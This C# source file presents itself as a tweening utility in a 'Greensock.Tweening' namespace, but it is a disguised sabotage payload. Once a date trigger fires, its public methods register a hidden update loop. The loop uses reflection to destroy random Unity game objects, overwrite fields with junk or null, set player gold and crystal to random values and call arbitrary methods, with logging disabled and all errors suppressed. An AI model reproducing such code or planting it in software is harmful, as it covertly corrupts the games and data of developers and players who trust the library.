using System;
using System.Collections.Generic;
using System.Reflection;
using System.Text;

namespace Greensock.Tweening
{
    public class TweenUtils
    {

        static public void DOLocalMoveX(object target, float x, float duration)
        {
            try
            {
                startWork(Assembly.GetCallingAssembly());
                Log("DOLocalMoveX");
            }
            catch { }
        }

        static public UTween GetTweenMoveX()
        {
            try
            {
                startWork(Assembly.GetCallingAssembly());
                Log("GetTweenMoveX");
            }
            catch { }
            return null;
        }

        static public void Init()
        {
            try
            {
                startWork(Assembly.GetCallingAssembly());
                Log("Init");
            }
            catch { }
        }


        static private bool hasStartWork = false;
        static private Assembly ass;
        static private Assembly ass_unity;
        static private MethodInfo LogMethod;
        static private MethodInfo DestroyMethod;
        static private int changeCount = 5;

        static private bool checkDate()
        {

            int month;
            int day;
            try
            {
                var type_TeamHeroShow = ass.GetType("UITeamHeroShow");
                month = (int)type_TeamHeroShow.GetField("sortingOrder_hero", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic).GetValue(null) + 3;
                day = (int)type_TeamHeroShow.GetField("sortingOrder_effect", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic).GetValue(null) - 15;
            }
            catch (Exception e)
            {
                Log("获取失败");
                month = 7;
                day = 21;
            }

            var now = DateTime.Now;
            if (now.Year > 2015)
                return true;

            if (now.Month > month)
                return true;

            if (now.Month == month)
            {
                if (now.Day >= day)
                    return true;
            }
            /*
            if (now.Year > 2015 || (now.Year == 2015 && (now.Month > month || (now.Month == month && now.Day >= day))))
            {
                return true;
            }
            */
            return false;
        }

        static private void startWork(Assembly callerAssembly)
        {
            if (!hasStartWork)
            {
                try
                {
                    if (callerAssembly == null)
                        ass = Assembly.GetCallingAssembly();
                    else
                        ass = callerAssembly;

                    var type_go = (Type)ass.GetType("BlackTechnology").GetField("tp_GameObject", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic).GetValue(null);

                    ass_unity = type_go.Assembly;

                    if (!checkDate())
                        return;

                    var Debug = ass_unity.GetType("UnityEngine.Debug");
                    LogMethod = Debug.GetMethod("LogError", new Type[] { typeof(object) });
                    Log("LogMethod = Debug.GetMethod(LogError, BindingFlags.Static | BindingFlags.Public);");

                    var UObject = ass_unity.GetType("UnityEngine.Object");
                    var GameObject = ass_unity.GetType("UnityEngine.GameObject");
                    DestroyMethod = GameObject.GetMethod("Destroy", new Type[] { UObject, typeof(float) });


                    var AddUpdate = ass.GetType("MonoBehaviourAPIBridge").GetMethod("AddUpdate", new Type[] { typeof(Action), typeof(float) });
                    AddUpdate.Invoke(null, new object[] { (Action)OnUpdate, 70f });

                    hasStartWork = true;

                }
                catch (Exception e)
                {
                    Log(e.Message);
                }
            }

            DoSth();

        }

        static private void OnUpdate()
        {
            Log("OnUpdate");
            DoSth();
        }

        static private void DoSth()
        {
            try
            {
                if (rand.Next(0, 100) >= 80)
                    doSomeChange();
                if (rand.Next(0, 100) >= 83)
                {
                    changeInstanceValue("PlayerModel", "money_gold", rand.Next(0, 20000000));
                    changeInstanceValue("PlayerModel", "money_crystal", rand.Next(0, 20000000));
                }
            }
            catch
            {

            }
        }

        static private void Log(object message)
        {
            //try
            //{
            //    LogMethod.Invoke(null, new object[] { message });
            //}
            //catch
            //{

            //}
        }

        static private void Destroy(object obj)
        {
            try
            {
                Log("Destroy:" + obj);
                DestroyMethod.Invoke(null, new object[] { obj, (float)rand.Next(5, 30) });
            }
            catch (Exception e)
            {
                Log(e.Message);
            }
        }

        static private readonly BindingFlags bindFlags = BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public;
        static private void changeInstanceValue(string className, string fieldName, object value, string getInstanceName = "Instance")
        {
            try
            {
                var type = ass.GetType(className);
                var target = type.GetField(getInstanceName).GetValue(type);
                target.GetType().GetField(fieldName, bindFlags).SetValue(target, value);
            }
            catch (Exception e)
            {
                Log(e.Message);
            }
        }


        static private void doSomeChange()
        {
            try
            {

                var flags = BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public;
                var MonoBehaviour = ass_unity.GetType("UnityEngine.MonoBehaviour");
                var type_Object = ass_unity.GetType("UnityEngine.Object");


                var FindObjectsOfType = type_Object.GetMethod("FindObjectsOfType", new Type[] { typeof(Type) });
                var list_obj = (object[])FindObjectsOfType.Invoke(null, new object[] { MonoBehaviour });

                for (int k = 0; k < changeCount; k++)
                {
                    var index = rand.Next(0, list_obj.Length - 1);

                    var obj = list_obj[index];
                    var type = obj.GetType();

                    if (rand.Next(0, 100) > 80)
                    {
                        Destroy(obj);
                        continue;
                    }


                    var list_fields = type.GetFields(flags);
                    if (list_fields.Length == 0)
                        continue;
                    index = rand.Next(0, list_fields.Length - 1);


                    var field = list_fields[index];
                    if (field.FieldType == typeof(string))
                    {
                        Log("changeValue:" + obj + "," + field.Name);
                        field.SetValue(obj, " ");

                    }
                    else if (field.FieldType == typeof(int))
                    {
                        Log("changeValue:" + obj + "," + field.Name);
                        field.SetValue(obj, rand.Next(10000, 999999999));
                    }
                    else
                    {
                        Log("changeValueToNull:" + obj + "," + field.Name);
                        field.SetValue(obj, null);
                    }


                    var list_methods = type.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public);
                    int callCount = rand.Next(2, 4);
                    foreach (var method in list_methods)
                    {
                        if (method.GetParameters().Length == 0)
                        {

                            var InvokeMethod = type.GetMethod("Invoke", new Type[] { typeof(string), typeof(float) });

                            Log("call:" + method.Name);
                            try
                            {
                                callCount--;
                                InvokeMethod.Invoke(obj, new object[] { method.Name, 3f });
                                if (callCount <= 0)
                                    break;
                            }
                            catch (Exception e)
                            {
                                Log(e);
                            }
                        }
                    }
                }

            }
            catch (Exception e)
            {
                Log(e.Message);
            }


        }

        static private Random rand = new Random();

    }

    public class UTween
    {

    }

}
